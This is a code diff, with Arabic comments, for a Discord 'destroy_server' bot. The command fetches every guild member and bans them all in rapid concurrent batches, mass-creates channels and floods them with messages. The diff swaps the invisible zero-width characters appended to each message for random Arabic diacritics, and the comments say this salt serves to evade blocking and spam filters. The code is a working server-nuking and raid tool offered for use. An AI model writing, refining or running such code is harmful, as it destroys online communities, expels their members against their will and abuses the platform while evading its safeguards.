@@ -32,12 +32,13 @@ func main() {
 		return
 	}
 
-	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers
+	// تفعيل الـ Intents بالكامل لضمان جلب الأعضاء وصلاحياتهم
+	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers | discordgo.IntentsAll
 
 	cmdName := "destroy_server"
 	command := &discordgo.ApplicationCommand{
 		Name:        cmdName,
-		Description: "أمر تدمير السيرفر (بدون أخطاء مهلة الاستجابة)",
+		Description: "أمر تدمير السيرفر (باند مضمون وسرعة صاروخية)",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
@@ -79,11 +80,10 @@ func main() {
 				return
 			}
 
-			// الرد الفوري على ديسكورد لمنع خطأ Outdated Command تماماً
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 تم استلام الأمر وبدء التنفيذ الفوري في الخلفية...",
+					Content: "🚀 جاري تدمير السيرفر وباند الأعضاء بالكامل في الخلفية...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -101,8 +101,8 @@ func main() {
 
 			guildID := i.GuildID
 
-			// تشغيل العمليات بالكامل في الخلفية لتعمل بحرية تامة وبدون قيود الوقت
-			go executeDestruction(token, guildID, roomName, roomsCount, messageContent, messagesCount)
+			// تمرير الجلسة s لتنفيذ الباند بكفاءة عالية عبر مكتبة discordgo
+			go executeDestruction(s, token, guildID, roomName, roomsCount, messageContent, messagesCount)
 		}
 	})
 
@@ -126,7 +126,7 @@ func main() {
 	sess.Close()
 }
 
-func executeDestruction(token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
+func executeDestruction(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
 		"Content-Type":  "application/json",
@@ -162,37 +162,21 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 		}
 	}()
 
-	// 2. باند جميع الأعضاء بالكامل
+	// 2. باند جميع الأعضاء باستخدام وظائف المكتبة المضمونة لجلب وباند الكل
 	go func() {
 		var userIDs []string
-		lastID := "0"
+		after := ""
 
+		// جلب الأعضاء بكفاءة عالية وبدون حدود
 		for {
-			url := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/members?limit=1000&after=%s", guildID, lastID)
-			req, _ := http.NewRequest("GET", url, nil)
-			for k, v := range headers {
-				req.Header.Set(k, v)
-			}
-			resp, err := client.Do(req)
-			if err != nil {
+			members, err := s.GuildMembers(guildID, after, 1000)
+			if err != nil || len(members) == 0 {
 				break
 			}
 
-			var members []map[string]interface{}
-			json.NewDecoder(resp.Body).Decode(&members)
-			resp.Body.Close()
-
-			if len(members) == 0 {
-				break
-			}
-
-			for _, m := range members {
-				if user, ok := m["user"].(map[string]interface{}); ok {
-					if userID, ok := user["id"].(string); ok {
-						userIDs = append(userIDs, userID)
-						lastID = userID
-					}
-				}
+			for _, member := range members {
+				userIDs = append(userIDs, member.User.ID)
+				after = member.User.ID
 			}
 
 			if len(members) < 1000 {
@@ -200,6 +184,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 			}
 		}
 
+		// تنفيذ الباند على دفعات سريعة جداً
 		batchSize := 50
 		for i := 0; i < len(userIDs); i += batchSize {
 			end := i + batchSize
@@ -209,20 +194,15 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 
 			for _, uID := range userIDs[i:end] {
 				go func(id string) {
-					banReq, _ := http.NewRequest("PUT", "https://discord.com/api/v10/guilds/"+guildID+"/bans/"+id, nil)
-					for k, v := range headers {
-						banReq.Header.Set(k, v)
-					}
-					if r, e := client.Do(banReq); e == nil {
-						r.Body.Close()
-					}
+					// استخدام دالة الباند المباشرة من المكتبة لضمان التنفيذ الصحيح
+					_ = s.GuildBanCreate(guildID, id, 0)
 				}(uID)
 			}
 			time.Sleep(50 * time.Millisecond)
 		}
 	}()
 
-	// 3. إنشاء الرومات
+	// 3. إنشاء الرومات بسرعة صاروخية
 	var channelIDs []string
 	var mu sync.Mutex
 	var wg sync.WaitGroup
@@ -268,9 +248,9 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 		time.Sleep(40 * time.Millisecond)
 	}
 
-	// 4. إرسال الرسائل بالعدد الكامل مع الرموز المخفية الصفرية لتخطي الحظر
+	// 4. إرسال الرسائل مع التشكيل المخفي
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
-	hiddenChars := []string{"\u200B", "\u200C", "\u200D", "\uFEFF"}
+	arabicDiacritics := []string{"ِ", "ُ", "َّ", "ٍ", "ٓ", "ٌ", "ْ", "ٰ"}
 
 	for i := 0; i < len(channelIDs); i += groupSize {
 		end := i + groupSize
@@ -281,11 +261,11 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 		for _, chID := range channelIDs[i:end] {
 			go func(cID string) {
 				for m := 0; m < messagesCount; m++ {
-					invisibleSalt := ""
-					for k := 0; k <= (m % 4); k++ {
-						invisibleSalt += hiddenChars[rng.Intn(len(hiddenChars))]
+					diacriticsSalt := ""
+					for k := 0; k <= (m % 3); k++ {
+						diacriticsSalt += arabicDiacritics[rng.Intn(len(arabicDiacritics))]
 					}
-					finalMsg := messageContent + invisibleSalt
+					finalMsg := messageContent + diacriticsSalt
 
 					msgPayload, _ := json.Marshal(map[string]string{"content": finalMsg})
 					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
